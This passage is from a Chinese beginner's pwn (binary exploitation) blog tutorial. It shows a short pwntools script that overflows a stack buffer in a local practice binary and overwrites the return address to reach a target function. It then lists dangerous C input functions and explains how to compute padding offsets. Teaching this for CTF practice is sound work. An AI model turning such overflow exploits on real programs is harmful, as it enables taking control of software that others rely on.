+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>success1_addr = <span class="hljs-number">0x40117B</span><br><br><span class="hljs-comment"># attach(p, &#x27;b *0x4011BC&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xC</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(success1_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>运行脚本</p>
+<img src="/post/47670/1729697249664-49cf7e81-9dc2-4720-93d6-b643c04c049a-1735222654798-182.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
+<ul>
+<li><p>输入</p>
+<ul>
+<li><p>gets，直接读取一行，忽略’\x00’</p>
+</li>
+<li><p>scanf</p>
+</li>
+<li><p>vscanf</p>
+</li>
+</ul>
+</li>
+<li><p>输出</p>
+<ul>
+<li><p>sprintf</p>
+</li>
+<li><p>字符串</p>
+</li>
+<li><p>strcpy，字符串复制，遇到’\x00’停止</p>
+</li>
+<li><p>strcat，字符串拼接，遇到’\x00’停止</p>
+</li>
+<li><p>bcopy</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
+<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
+<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
+<h2 id="参考阅读"><a href="#参考阅读" class="headerlink" title="参考阅读"></a>参考阅读</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Pwn入门系列（一）</div>
+      <div>https://tsuk1ctf.github.io/post/47670.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tsuk1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/10828.html" title="Pwn入门系列（二）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Pwn入门系列（二）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/17727.html" title="glibc-all-in-one添加libc">
+                        <span class="hidden-mobile">glibc-all-in-one添加libc</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
